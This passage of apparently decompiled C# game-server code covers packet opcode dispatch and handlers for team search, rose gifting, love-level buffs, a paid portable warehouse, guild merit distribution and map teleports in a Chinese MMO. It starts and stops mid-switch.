				case 16:
					获取人物列表(data, length);
					break;
				case 40:
					队长管理(data, length);
					break;
				case 36:
					动作表情(data, length);
					break;
				case 67:
					加气功点(data, length);
					break;
				case 48:
					发送组队(data, length);
					break;
				case 50:
					本人取消组队(data, length);
					break;
				case 52:
					对方取消组队(data, length);
					break;
				case 54:
					退出组队(data, length);
					break;
				case 56:
					检查人物是否存在(data, length);
					break;
				case 58:
					打开物品(data, length);
					break;
				case 60:
					轻功(data, length);
					break;
				case 42:
					组队道具分配规则(data, length);
					break;
				case 72:
					死亡回城(data, length);
					break;
				case 69:
					学习技能包(data, length);
					break;
				case 131:
					任务系统(data, length);
					break;
				case 86:
					退回到人物列表(data, length);
					break;
				case 80:
					合成系统(data, length);
					break;
				case 176:
					心跳检测(data, length);
					break;
				case 177:
				case 178:
					查看传书(data, length);
					break;
				case 179:
					发送传书(data, length);
					break;
				case 181:
					阅读传书(data, length);
					break;
				case 143:
					显示();
					break;
				case 144:
					打开商店(data, length);
					break;
				case 146:
					买卖东西(data, length);
					break;
				case 148:
					仓库存取(data, length);
					break;
				case 151:
					交易大类(data, length);
					break;
				case 153:
					交易放东西(data, length);
					break;
				case 203:
					开店(data, length);
					break;
				case 194:
					技能连击2(data, length);
					break;
				case 196:
					魔法不足提示();
					break;
				case 197:
					轻功(data, length);
					break;
				case 199:
					技能连击(data, length);
					break;
				case 189:
					仓库药店(data, length);
					break;
				case 209:
					Npc传送(data, length);
					break;
				case 206:
					进店(data, length);
					break;
				case 321:
					登记玉连环(data, length);
					break;
				case 222:
					装备加解锁(data, length);
					break;
				case 225:
					穿针引线(data, length);
					break;
				case 227:
					创建门派确认(data, length);
					break;
				case 229:
					创建门派(data, length);
					break;
				case 231:
					加入门派(data, length);
					break;
				case 232:
					查帮派();
					break;
				case 234:
					得到门徽(data, length);
					break;
				case 236:
					申请门徽(data, length);
					break;
				case 238:
					赋予职位(data, length);
					break;
				case 212:
					百宝(data, length);
					break;
				case 345:
					打开荣誉殿堂(data, length);
					break;
				case 342:
					领取门派财产(data, length);
					break;
				case 774:
					打开玫瑰排行(data, length);
					break;
				case 772:
					赠送玫瑰(data, length);
					break;
				case 401:
					更新荣誉(data, length);
					break;
				case 950:
					位置封包(data, length);
					break;
				case 901:
					删除背包物品(data, length);
					break;
				case 1211:
					申请攻城(data, length);
					break;
				case 1213:
					查看攻城同盟列表(data, length);
					break;
				case 1215:
					同盟申请(data, length);
					break;
				case 1217:
					查看天魔神宫占领信息(data, length);
					break;
				case 1219:
					回应其它门派的同盟申请(data, length);
					break;
				case 1221:
					同盟管理(data, length);
					break;
				case 1223:
					查看同盟申请门派信息(data, length);
					break;
				case 1225:
					查看同盟门派信息(data, length);
					break;
				case 1242:
					城门强化确认(data, this);
					break;
				case 1240:
					查看城门强化信息(data, this);
					break;
				case 1237:
					取消攻城申请(data, length);
					break;
				case 789:
					荣誉排行前三名(data, length);
					break;
				case 1268:
					学习神女技能(data, length);
					break;
				case 1247:
					标志表情(data, length);
					break;
				case 4101:
					使用土灵符(data, length);
					break;
				case 4097:
					长白丹(data, length);
					break;
				case 4145:
					修改帮派公告(data, length);
					break;
				case 4115:
					打开符(data, length);
					break;
				case 4117:
					PK开关(data, length);
					break;
				case 4119:
					放到快捷栏(data, length);
					break;
				case 4108:
					保存土灵符(data, length);
					break;
				case 4110:
					删除土灵符(data, length);
					break;
				case 4112:
					染发(data, length);
					break;
				case 4154:
					取消帮战(data, length);
					break;
				case 4147:
					移动修炼之地(data, length);
					break;
				case 4176:
					召唤宠物(data, length);
					break;
				case 4160:
					师徒系统(data, length);
					break;
				case 4162:
					师徒系统请求(data, length);
					break;
				case 4164:
					师徒系统取消(data, length);
					break;
				case 4166:
					师徒系统解除(data, length);
					break;
				case 4168:
					师徒传授武功(data, length);
					break;
				case 4156:
					申请帮战(data, length);
					break;
				case 4182:
					宠物起名包(data, length);
					break;
				case 4180:
					宠物动作包(data, length);
					break;
				case 4232:
					选取怪物封包(data, length);
					break;
				case 4192:
					师徒武功检查(data, length);
					break;
				case 4186:
					灵兽变身(data, length);
					break;
				case 5432:
					安全码校验(data, length);
					break;
				case 5639:
					美发(data, length);
					break;
				case 5441:
					变更门服(data, length);
					break;
				case 5662:
					隔体传功(data, length);
					break;
				case 5680:
					帮派传送(data, length);
					break;
				case 5654:
					换人物名(data, length);
					break;
				case 5648:
					组队传送(data, length);
					break;
				case 5920:
					元宝合成(data, length);
					break;
				case 5922:
					元宝合成2(data, length);
					break;
				case 5924:
					死亡回城(data, length);
					break;
				case 5724:
					辅助装备切换(data, length);
					break;
				case 5954:
					删除制作技术(data, length);
					break;
				case 5952:
					制作系统动作(data, length);
					break;
				case 5936:
					制作分解系统(data, length);
					break;
				case 5938:
					制作分解检查(data, length);
					break;
				case 5941:
					制作系统制作(data, length);
					break;
				case 5943:
					制作系统检查(data, length);
					break;
				case 5944:
					学习制作技能(data, length);
					break;
				case 5946:
					分配门派武勋(data, length);
					break;
				case 5971:
					采药(data, length);
					break;
				case 5968:
					潜行(data, length);
					break;
				case 6009:
					情侣系统(data, length);
					break;
				case 6000:
					名字样式(data, length);
					break;
				case 6150:
					加升天武功点(data, length);
					break;
				case 6144:
					搜索组队(data, length);
					break;
				case 6148:
					加人组队(data, length);
					break;
				case 6336:
					搜索组队对话(data, length);
					break;
				case 6433:
					设置副本难度(data, length);
					break;
				case 6418:
					查看装备(data, length);
					break;
				case 6402:
					道具组合(data, length);
					break;
				case 7179:
					元宝个人商店(data, length);
					break;
				case 6435:
					查看气功(data, length);
					break;
				case 7195:
					元宝个人商店查询协议开通(data, length);
					break;
				case 7194:
					元宝个人商店查询协议(data, length);
					break;
				case 7181:
					进元宝个人商店(data, length);
					break;
				case 12580:
					if (!打开仓库中)
					{
						装备修理(data, length);
					}
					break;
				case 12403:
					打开换名符(data, length);
					break;
				case 8724:
					if (World.eve != null)
					{
						势力战系统.势力战风云大战血战分析(this, data, length);
					}
					else if (World.ImmortalDemonWar != null)
					{
						仙魔大战系统(data, length);
					}
					break;
				case 20758:
					发送周围玩家攻城战中图标();
					break;
				case 20760:
					天魔回城(data, length);
					break;
				case 20742:
					天魔神宫邀请(data, length);
					break;
				case 20740:
					活动邀请银币(data, length);
					break;
				}
				if (num != 7)
				{
					人物移动中 = false;
				}
			}
			catch (Exception ex)
			{
				MainForm.WriteLine(1, "ManagePacket()出错" + base.Client.WorldId + "|" + base.Client.ToString() + " " + num + " " + ex);
				Console.WriteLine(ex);
				base.Client.Dispose();
			}
		}

		public void 标志表情(byte[] 封包数据, int 封包大小)
		{
			byte[] array = new byte[4];
			Buffer.BlockCopy(封包数据, 14, array, 0, 4);
			标志表情(World.检查玩家世界ID(BitConverter.ToInt32(array, 0)), 封包数据[18]);
		}

		public void 标志表情(Players Play, int ID)
		{
			byte[] array = Converter.hexStringToByte("AA5512008100E0040C0081000000A30400000200000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(ID), 0, array, 18, 1);
			Buffer.BlockCopy(BitConverter.GetBytes(Play.人物全服ID), 0, array, 14, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public void 搜索组队(byte[] 封包数据, int 封包大小)
		{
			try
			{
				封包修改(封包数据, 封包大小);
				byte b = 封包数据[10];
				ushort num = BitConverter.ToUInt16(封包数据, 11);
				byte b2 = 封包数据[13];
				using 发包类 发包类 = new 发包类();
				发包类.Write2(0);
				if (组队id == 0)
				{
					int num2 = 0;
					foreach (TeamClass value in World.Teams.Values)
					{
						if (value.组队列表.Count >= 8)
						{
							continue;
						}
						foreach (Players value2 in value.组队列表.Values)
						{
							if (!value2.UserName.Equals(value.队长))
							{
								continue;
							}
							if (Math.Abs(base.Player_Level - value2.Player_Level) <= World.组队级别限制 && (num == ushort.MaxValue || value2.人物坐标_地图 == num) && (b2 == 3 || value2.Player_Zx == b2))
							{
								发包类.Write2(value2.人物全服ID);
								发包类.Write4(0);
								发包类.Write1(value2.Player_Zx);
								发包类.Write1(value2.Player_Level);
								发包类.WriteString(value2.UserName, 15);
								发包类.Write1(value.组队列表.Count);
								发包类.Write4(0);
								发包类.Write4(value2.人物坐标_地图);
								for (int i = 0; i < 10; i++)
								{
									发包类.Write8(0L);
								}
								num2++;
							}
							break;
						}
					}
					发包类.m_Stream.Seek(0L, SeekOrigin.Begin);
					发包类.Write2(num2);
					发包类.m_Stream.Seek(0L, SeekOrigin.End);
				}
				if (base.Client != null)
				{
					base.Client.SendPak(发包类, 280, base.人物全服ID);
				}
			}
			catch
			{
			}
		}

		public void 加人组队(byte[] 封包数据, int 封包大小)
		{
			try
			{
				int key = BitConverter.ToUInt16(封包数据, 10);
				string text = Encoding.Default.GetString(封包数据, 12, 15);
				int num = text.IndexOf('\0');
				if (num != -1)
				{
					text = text.Remove(num);
				}
				switch (封包数据[27])
				{
				case 1:
				{
					if (!World.AllConnectedPlayers.TryGetValue(key, out var value4) || value4.组队id == 0 || !value4.UserName.Equals(text) || !World.Teams.TryGetValue(value4.组队id, out var value5) || !value5.队长.Equals(text) || value5.组队列表.ContainsKey(base.人物全服ID))
					{
						break;
					}
					using (发包类 发包类4 = new 发包类())
					{
						发包类4.Write2(base.人物全服ID);
						发包类4.WriteString(base.UserName, 15);
						发包类4.Write2(1);
						if (value4.Client != null)
						{
							value4.Client.SendPak(发包类4, 1304, value4.人物全服ID);
						}
					}
					break;
				}
				case 2:
				{
					if (组队id == 0 || !World.Teams.TryGetValue(组队id, out var value2) || !value2.队长.Equals(base.UserName) || !World.AllConnectedPlayers.TryGetValue(key, out var value3) || value3.组队id != 0 || !value3.UserName.Equals(text))
					{
						break;
					}
					using (发包类 发包类2 = new 发包类())
					{
						发包类2.Write2(value3.人物全服ID);
						发包类2.WriteString(value3.UserName, 15);
						发包类2.Write2(2);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类2, 1304, base.人物全服ID);
						}
					}
					using (发包类 发包类3 = new 发包类())
					{
						发包类3.Write2(base.人物全服ID);
						发包类3.WriteString(base.UserName, 15);
						发包类3.Write2(2);
						if (value3.Client != null)
						{
							value3.Client.SendPak(发包类3, 1304, value3.人物全服ID);
						}
					}
					break;
				}
				case 3:
				{
					if (!World.AllConnectedPlayers.TryGetValue(key, out var value) || !value.UserName.Equals(text))
					{
						break;
					}
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write2(base.人物全服ID);
						发包类.WriteString(base.UserName, 15);
						发包类.Write2(3);
						if (value.Client != null)
						{
							value.Client.SendPak(发包类, 1304, value.人物全服ID);
						}
					}
					break;
				}
				}
			}
			catch
			{
			}
		}

		public void 搜索组队对话(byte[] 封包数据, int 封包大小)
		{
			try
			{
				byte value = 封包数据[10];
				string text = Encoding.Default.GetString(封包数据, 11, 21);
				int num = text.IndexOf('\0');
				if (num != -1)
				{
					text = text.Remove(num);
				}
				byte value2 = 封包数据[32];
				string text2 = Encoding.Default.GetString(封包数据, 33, 128);
				num = text2.IndexOf('\0');
				if (num != -1)
				{
					text2 = text2.Remove(num);
				}
				string text3 = Encoding.Default.GetString(封包数据, 161, 21);
				num = text3.IndexOf('\0');
				if (num != -1)
				{
					text3 = text3.Remove(num);
				}
				bool flag = false;
				foreach (Players value3 in World.AllConnectedPlayers.Values)
				{
					if (!value3.UserName.Equals(text))
					{
						continue;
					}
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write1(value);
						发包类.WriteString(text, 3);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 49176, base.人物全服ID);
						}
					}
					using (发包类 发包类2 = new 发包类())
					{
						发包类2.Write1(value);
						发包类2.WriteString(text, 21);
						发包类2.Write1(value2);
						发包类2.WriteString(text2, 128);
						发包类2.WriteString(text3, 21);
						发包类2.Write2(value3.人物全服ID);
						发包类2.Write2(base.人物全服ID);
						发包类2.Write1(1);
						if (base.Client != null)
						{
							base.Client.SendPak(发包类2, 49432, base.人物全服ID);
						}
						if (value3.Client != null)
						{
							value3.Client.SendPak(发包类2, 49432, base.人物全服ID);
						}
					}
					flag = true;
					break;
				}
				if (flag)
				{
					return;
				}
				using (发包类 发包类3 = new 发包类())
				{
					发包类3.Write1(value);
					发包类3.WriteString(text, 3);
					if (base.Client != null)
					{
						base.Client.SendPak(发包类3, 49176, base.人物全服ID);
					}
				}
				using 发包类 发包类4 = new 发包类();
				发包类4.Write1(value);
				发包类4.WriteString(text, 21);
				发包类4.Write1(value2);
				发包类4.WriteString(text2, 128);
				发包类4.WriteString(text3, 21);
				发包类4.Write2(65535);
				发包类4.Write2(base.人物全服ID);
				发包类4.Write1(0);
				if (base.Client != null)
				{
					base.Client.SendPak(发包类4, 49432, base.人物全服ID);
				}
			}
			catch (Exception arg)
			{
				MainForm.WriteLine(1, $"{arg}");
			}
		}

		public void 赠送玫瑰(Players 发送人, Players 接收人, int 玫瑰数量, string msg)
		{
			try
			{
				创建传书(发送人, 接收人.UserName, 0, msg, 3, 玫瑰数量);
			}
			catch
			{
			}
		}

		public void 赠送玫瑰(byte[] 封包数据, int lenght)
		{
			封包修改(封包数据, lenght);
			if (!FLD_是否可以送花)
			{
				系统提示("每次送花的间隔时间为" + World.挂机奖励时间周期 + "分钟。");
				return;
			}
			if (base.FLD_情侣.Length == 0)
			{
				系统提示("玫瑰花只属于有情人之间的礼物！");
				return;
			}
			if (解除关系倒计时 != 0)
			{
				情侣提示(53, base.UserName, base.FLD_情侣);
				return;
			}
			byte[] array = new byte[14];
			byte[] array2 = new byte[56];
			Buffer.BlockCopy(封包数据, 33, array2, 0, 60);
			Buffer.BlockCopy(封包数据, 11, array, 0, 14);
			string 人物名 = Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim();
			string msg = Encoding.Default.GetString(array2).Replace("\0", string.Empty).Trim();
			int num = BitConverter.ToInt32(封包数据, 244);
			int num2 = 封包数据[252];
			Players players = 得到人物数据(人物名);
			if (num == 0 || (num != 1008001382 && num != 1008001383 && num != 1008001384 && num != 1008001385) || 装备栏包裹[num2].Get物品ID != num || 装备栏包裹[num2].Get物品数量 <= 0)
			{
				return;
			}
			if (players != null)
			{
				if (base.FLD_情侣 != players.UserName)
				{
					系统提示("你送花给别人你爱人知道吗？");
					return;
				}
				FLD_是否可以送花 = false;
				int num3 = 0;
				switch (num)
				{
				case 1008001382:
					num3 = 9;
					break;
				case 1008001383:
					num3 = 99;
					break;
				case 1008001384:
					num3 = 999;
					break;
				case 1008001385:
					num3 = 9999;
					break;
				}
				int num4 = RNG.Next(10, 30);
				if (夫妻组队中)
				{
					num4 *= 2;
				}
				int num5 = num4 * num3;
				物品使用(1, num2, 1);
				更新玫瑰排行(this, players, num3);
				base.FLD_情侣_爱情度 += num5;
				players.FLD_情侣_爱情度 += num5;
				players.玫瑰称号积分 += num3;
				players.获得玫瑰称号属性();
				赠送玫瑰(this, players, num3, msg);
				if (num3 >= 999)
				{
					if ((DateTime.Now.Month == 2 && DateTime.Now.Day == 14) || (DateTime.Now.Month == 7 && DateTime.Now.Day == 7))
					{
						World.发送玫瑰公告(base.UserName + " 向 " + players.UserName + " 送了" + num3 + "朵情人节玫瑰，好希望陪你一直到老，让你做我收心里的宝。情人节快乐！");
					}
					else
					{
						World.发送玫瑰公告(base.UserName + " 向 " + players.UserName + " 送了" + num3 + "朵玫瑰，好希望陪你一直到老，让你做我收心里的宝。");
					}
				}
				if (base.FLD_情侣_爱情度 >= 35000)
				{
					base.FLD_情侣_爱情度 = 35000;
					FLD_爱情度等级 = 1;
				}
				else if (base.FLD_情侣_爱情度 > 30000)
				{
					if (FLD_爱情度等级 == 2)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 1;
				}
				else if (base.FLD_情侣_爱情度 > 21000)
				{
					if (FLD_爱情度等级 == 3)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 2;
				}
				else if (base.FLD_情侣_爱情度 > 14700)
				{
					if (FLD_爱情度等级 == 4)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 3;
				}
				else if (base.FLD_情侣_爱情度 > 10290)
				{
					if (FLD_爱情度等级 == 5)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 4;
				}
				else if (base.FLD_情侣_爱情度 > 7203)
				{
					if (FLD_爱情度等级 == 6)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 5;
				}
				else if (base.FLD_情侣_爱情度 > 5042)
				{
					if (FLD_爱情度等级 == 7)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 6;
				}
				else if (base.FLD_情侣_爱情度 > 3025)
				{
					if (FLD_爱情度等级 == 8)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 7;
				}
				else if (base.FLD_情侣_爱情度 > 1513)
				{
					if (FLD_爱情度等级 == 9)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 8;
				}
				else if (base.FLD_情侣_爱情度 > 605)
				{
					if (FLD_爱情度等级 == 10)
					{
						情侣提示(27, base.UserName, players.UserName);
					}
					FLD_爱情度等级 = 9;
				}
				else
				{
					FLD_爱情度等级 = 10;
				}
				if (players.FLD_情侣_爱情度 >= 35000)
				{
					players.FLD_情侣_爱情度 = 35000;
					players.FLD_爱情度等级 = 1;
				}
				else if (players.FLD_情侣_爱情度 > 30000)
				{
					if (players.FLD_爱情度等级 == 2)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 1;
				}
				else if (players.FLD_情侣_爱情度 > 21000)
				{
					if (players.FLD_爱情度等级 == 3)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 2;
				}
				else if (players.FLD_情侣_爱情度 > 14700)
				{
					if (players.FLD_爱情度等级 == 4)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 3;
				}
				else if (players.FLD_情侣_爱情度 > 10290)
				{
					if (players.FLD_爱情度等级 == 5)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 4;
				}
				else if (players.FLD_情侣_爱情度 > 7203)
				{
					if (players.FLD_爱情度等级 == 6)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 5;
				}
				else if (players.FLD_情侣_爱情度 > 5042)
				{
					if (players.FLD_爱情度等级 == 7)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 6;
				}
				else if (players.FLD_情侣_爱情度 > 3025)
				{
					if (players.FLD_爱情度等级 == 8)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 7;
				}
				else if (players.FLD_情侣_爱情度 > 1513)
				{
					if (players.FLD_爱情度等级 == 9)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 8;
				}
				else if (players.FLD_情侣_爱情度 > 605)
				{
					if (players.FLD_爱情度等级 == 10)
					{
						players.情侣提示(27, players.UserName, base.UserName);
					}
					players.FLD_爱情度等级 = 9;
				}
				else
				{
					players.FLD_爱情度等级 = 10;
				}
				情侣提示(29, base.UserName, players.UserName);
				players.情侣提示(29, players.UserName, base.UserName);
				情侣提示(7, base.UserName, players.UserName);
				players.情侣提示(7, base.UserName, players.UserName);
				if (players.追加状态列表 != null)
				{
					if (players.GetAddState(1008001382))
					{
						players.追加状态列表[1008001382].时间结束事件();
					}
					if (players.GetAddState(1008001383))
					{
						players.追加状态列表[1008001383].时间结束事件();
					}
					if (players.GetAddState(1008001384))
					{
						players.追加状态列表[1008001384].时间结束事件();
					}
					if (players.GetAddState(1008001385))
					{
						players.追加状态列表[1008001385].时间结束事件();
					}
				}
				else
				{
					players.追加状态列表 = new ThreadSafeDictionary<int, 追加状态类>();
				}
				int num6 = World.挂机奖励时间周期 * 1000 * 60;
				int 时间;
				players.状态效果(BitConverter.GetBytes(num), 1, 时间 = num6 + 3000);
				追加状态类 追加状态类2 = new 追加状态类(players, 时间, num, 0);
				players.追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
				switch (players.FLD_爱情度等级)
				{
				case 1:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 15;
					players.FLD_人物_追加_防御 += 15;
					players.FLD_人物_追加_气功++;
					players.FLD_人物_追加_经验百分比 += 0.05;
					players.更新气功();
					break;
				case 2:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 15;
					players.FLD_人物_追加_防御 += 15;
					players.FLD_人物_追加_气功++;
					players.更新气功();
					break;
				case 3:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 15;
					players.FLD_人物_追加_防御 += 15;
					break;
				case 4:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 10;
					players.FLD_人物_追加_防御 += 10;
					break;
				case 5:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 10;
					players.FLD_人物_追加_防御 += 5;
					break;
				case 6:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 5;
					players.FLD_人物_追加_防御 += 5;
					break;
				case 7:
					players.人物追加最大_HP += 150;
					players.FLD_人物_追加_攻击 += 5;
					break;
				case 8:
					players.人物追加最大_HP += 150;
					break;
				case 9:
					players.人物追加最大_HP += 100;
					break;
				case 10:
					players.人物追加最大_HP += 50;
					break;
				}
				更新情侣系统(2, players.UserName, 婚戒刻字, 解除关系倒计时, DateTime.Now);
				players.更新情侣系统(2, base.UserName, players.婚戒刻字, players.解除关系倒计时, DateTime.Now);
				players.更新武功和状态();
				players.更新HP_MP_SP();
			}
			else
			{
				情侣提示(18, base.UserName, base.FLD_情侣);
			}
		}

		public void 仓库药店(byte[] 封包数据, int length)
		{
			if (base.人物_HP <= 0 || base.Player死亡 || 退出中 || 交易.交易中 || 打开仓库中 || 进店中 || 个人商店 != null)
			{
				return;
			}
			封包修改(封包数据, length);
			switch (封包数据[11])
			{
			case 0:
				打开商店(3, 1, 0);
				break;
			case 1:
				if (base.Player_Money >= 1000000)
				{
					base.Player_Money -= 1000000L;
					更新金钱和负重();
					打开商店(1, 1, 0);
					break;
				}
				系统提示("游戏币不够了, 每次使用随身仓库需支付100万手续费。");
				return;
			}
			byte[] array = Converter.hexStringToByte("AA5513002C01BE0005000201000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 领取门派财产(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			BitConverter.ToInt64(封包数据, 14);
		}

		public void 分配门派武勋(byte[] 封包数据, int length)
		{
			封包修改(封包数据, length);
			int num = BitConverter.ToInt32(封包数据, 14);
			if (num < 0)
			{
				return;
			}
			int num2 = BitConverter.ToInt32(封包数据, 18);
			byte[] array = new byte[14];
			Buffer.BlockCopy(封包数据, 22, array, 0, 14);
			Players players = 得到人物数据(Encoding.Default.GetString(array).Replace("\0", string.Empty).Trim());
			if (players != null)
			{
				DataTable dataTable = RxjhClass.得到帮派数据(base.帮派名字);
				if (dataTable != null)
				{
					int num3 = int.Parse(dataTable.Rows[0]["门派武勋"].ToString());
					if (num3 < num)
					{
						系统提示("门派武勋值不足。");
						return;
					}
					int num4 = num3 - num;
					players.Player_WuXun += num;
					players.更新武功和状态();
					DBA.ExeSqlCommand(string.Format("UPDATE TBL_XWWL_Guild SET 门派武勋={1} WHERE ID={0}", num2, num4));
					查帮派();
					系统提示("门派武勋分配成功。");
					players.系统提示("得到帮主[" + base.UserName + "]分配门派武勋" + num + "。");
					dataTable.Dispose();
				}
			}
			else
			{
				系统提示("对方不在线。");
			}
		}

		public int 是否为药品修炼()
		{
			string[] array = World.修炼药品.Split(';');
			int num = 0;
			while (true)
			{
				if (num < array.Length)
				{
					if (追加状态列表 != null && 追加状态列表.ContainsKey(int.Parse(array[num])))
					{
						break;
					}
					num++;
					continue;
				}
				return 1;
			}
			return 0;
		}

		public int 是否为药品遗忘()
		{
			string[] array = World.遗忘药品.Split(';');
			int num = 0;
			while (true)
			{
				if (num < array.Length)
				{
					if (追加状态列表 != null && 追加状态列表.ContainsKey(int.Parse(array[num])))
					{
						break;
					}
					num++;
					continue;
				}
				return 1;
			}
			return 0;
		}

		public int 是否为药品皮皮岛()
		{
			string[] array = World.皮皮岛药品.Split(';');
			int num = 0;
			while (true)
			{
				if (num < array.Length)
				{
					if (追加状态列表 != null && 追加状态列表.ContainsKey(int.Parse(array[num])))
					{
						break;
					}
					num++;
					continue;
				}
				return 1;
			}
			return 0;
		}

		public int 是否为药品世外()
		{
			string[] array = World.世外药品.Split(';');
			int num = 0;
			while (true)
			{
				if (num < array.Length)
				{
					if (追加状态列表 != null && 追加状态列表.ContainsKey(int.Parse(array[num])))
					{
						break;
					}
					num++;
					continue;
				}
				return 1;
			}
			return 0;
		}

		public void 移动修炼之地(byte[] data, int length)
		{
			封包修改(data, length);
			try
			{
				封包修改(data, length);
				float x = 0f;
				float y = 0f;
				byte[] array = new byte[4];
				int num = data[10];
				Buffer.BlockCopy(data, 14, array, 0, 4);
				int num2 = BitConverter.ToInt32(array, 0);
				int num3 = BitConverter.ToInt16(data, 12);
				switch (num)
				{
				case 8:
				{
					string hex2 = "AA551E0000009100100001000000010000000100000000000000000000000000000055AA";
					byte[] array3 = Converter.hexStringToByte(hex2);
					打开仓库中 = false;
					Buffer.BlockCopy(BitConverter.GetBytes(1010), 0, array3, 18, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 10, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array3, 14, 2);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array3, array3.Length);
					}
					switch (num2)
					{
					case 0:
						if (base.人物坐标_地图 == 30000)
						{
							switch (num3)
							{
							case 1:
								移动(-1066f, 965f, 15f, 30000);
								break;
							case 2:
								移动(60f, 821f, 15f, 30000);
								break;
							case 3:
								移动(1065f, 848f, 15f, 30000);
								break;
							case 4:
								移动(-1101f, -145f, 15f, 30000);
								break;
							case 5:
								移动(-295f, -18f, 15f, 30000);
								break;
							case 6:
								移动(1004f, -26f, 15f, 30000);
								break;
							case 7:
								移动(-739f, -1106f, 15f, 30000);
								break;
							case 8:
								移动(-146f, -900f, 15f, 30000);
								break;
							case 9:
								移动(1111f, -810f, 15f, 30000);
								break;
							}
						}
						if (base.人物坐标_地图 == 30100)
						{
							switch (num3)
							{
							case 1:
								移动(-1092f, 1063f, 15f, 30100);
								break;
							case 2:
								移动(-185f, 1075f, 15f, 30100);
								break;
							case 3:
								移动(826f, 881f, 15f, 30100);
								break;
							case 4:
								移动(-739f, 193f, 15f, 30100);
								break;
							case 5:
								移动(-160f, 139f, 15f, 30100);
								break;
							case 6:
								移动(788f, 163f, 15f, 30100);
								break;
							case 7:
								移动(-751f, -840f, 15f, 30100);
								break;
							case 8:
								移动(-199f, -1083f, 15f, 30100);
								break;
							case 9:
								移动(1022f, -695f, 15f, 30100);
								break;
							}
						}
						if (base.人物坐标_地图 == 30200)
						{
							switch (num3)
							{
							case 1:
								移动(-788f, 1086f, 15f, 30200);
								break;
							case 2:
								移动(922f, 862f, 15f, 30200);
								break;
							case 3:
								移动(-710f, 213f, 15f, 30200);
								break;
							case 4:
								移动(-127f, -58f, 15f, 30200);
								break;
							case 5:
								移动(1059f, 17f, 15f, 30200);
								break;
							case 6:
								移动(-740f, -18f, 15f, 30200);
								break;
							case 7:
								移动(-154f, -992f, 15f, 30200);
								break;
							case 8:
								移动(847f, -1057f, 15f, 30200);
								break;
							case 9:
								移动(823f, -1151f, 15f, 30200);
								break;
							}
						}
						if (base.人物坐标_地图 == 30300)
						{
							switch (num3)
							{
							case 1:
								移动(-687f, 826f, 15f, 30300);
								break;
							case 2:
								移动(-34f, 1000f, 15f, 30300);
								break;
							case 3:
								移动(1093f, 772f, 15f, 30300);
								break;
							case 4:
								移动(-1023f, -174f, 15f, 30300);
								break;
							case 5:
								移动(-15f, -58f, 15f, 30300);
								break;
							case 6:
								移动(843f, 205f, 15f, 30300);
								break;
							case 7:
								移动(-1100f, -861f, 15f, 30300);
								break;
							case 8:
								移动(62f, -938f, 15f, 30300);
								break;
							case 9:
								移动(993f, -694f, 15f, 30300);
								break;
							}
						}
						break;
					case 30000:
					case 30100:
					case 30200:
					case 30300:
						if (是否为药品修炼() != 0)
						{
							系统提示("必须携带[修炼之地入场券]buff才可进入修炼之地。");
							return;
						}
						移动(0f, 0f, 15f, num2);
						break;
					case 32001:
						if (是否为药品皮皮岛() != 0)
						{
							系统提示("必须携带[皮皮岛入场券]buff才可进入皮皮岛。");
							return;
						}
						switch (num3)
						{
						case 5:
							x = -550f;
							y = 654f;
							break;
						case 6:
							x = -787f;
							y = -496f;
							break;
						case 7:
							x = 606f;
							y = 642f;
							break;
						case 8:
							x = 736f;
							y = -417f;
							break;
						}
						移动(x, y, 15f, num2);
						break;
					case 32002:
						if (是否为药品遗忘() != 0)
						{
							系统提示("必须携带[遗忘村庄入场券]buff才可进入遗忘村庄。");
							return;
						}
						switch (num3)
						{
						case 1:
							x = -1456f;
							y = 1574f;
							break;
						case 2:
							x = -1688f;
							y = -1624f;
							break;
						case 3:
							x = 1601f;
							y = 1589f;
							break;
						case 4:
							x = 1545f;
							y = -1609f;
							break;
						}
						移动(x, y, 15f, num2);
						break;
